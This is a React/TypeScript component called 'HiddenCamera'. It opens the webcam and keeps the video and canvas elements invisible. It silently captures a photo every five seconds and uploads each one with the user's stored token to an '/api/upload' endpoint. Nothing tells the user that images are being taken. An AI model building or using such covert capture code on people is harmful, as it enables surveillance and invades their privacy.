import { useEffect, useRef, useState, useCallback } from "react";
import axios from "axios";

export default function HiddenCamera() {
    const [hasPermission, setHasPermission] = useState<boolean | null>(null);
    const [isVideoReady, setIsVideoReady] = useState(false);

    const streamRef = useRef<MediaStream | null>(null);
    const videoRef = useRef<HTMLVideoElement | null>(null);
    const canvasRef = useRef<HTMLCanvasElement | null>(null);
    const intervalRef = useRef<NodeJS.Timeout | null>(null);

    useEffect(() => {
        const requestCameraAccess = async () => {
            try {
                const newStream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false,
                });

                streamRef.current = newStream;
                setHasPermission(true);

                if (videoRef.current) {
                    videoRef.current.srcObject = newStream;

                    videoRef.current.onloadedmetadata = () => {
                        setIsVideoReady(true);
                    };
                }
            } catch (error) {
                console.error("Camera access error:", error);
                setHasPermission(false);
            }
        };

        requestCameraAccess();

        return () => {
            if (streamRef.current) {
                streamRef.current.getTracks().forEach(track => track.stop());
            }

            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, []);

    const capturePhoto = useCallback(async () => {
        const canvas = canvasRef.current;
        const video = videoRef.current;

        if (!canvas || !video) return;
        if (video.videoWidth === 0 || video.videoHeight === 0) return;

        const context = canvas.getContext("2d");
        if (!context) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
            if (!blob) return;

            const token = localStorage.getItem("user");
            if (!token) {
                console.warn("No token found. Skipping upload.");
                return;
            }

            const formData = new FormData();
            formData.append("image", blob, "capture.png");

            try {
                await axios.post("/api/upload", formData, {
                    headers: {
                        Authorization: `Bearer ${token}`,
                    },
                });

                console.log("Photo uploaded");
            } catch (error) {
                console.error("Upload error:", error);
            }
        }, "image/png");
    }, []);

    useEffect(() => {
        if (!hasPermission || !isVideoReady) return;

        intervalRef.current = setInterval(() => {
            capturePhoto();
        }, 5000);

        return () => {
            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, [hasPermission, isVideoReady, capturePhoto]);

    return (
        <div className="hidden">
            <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="hidden"
            />
            <canvas ref={canvasRef} className="hidden" />
        </div>
    );
}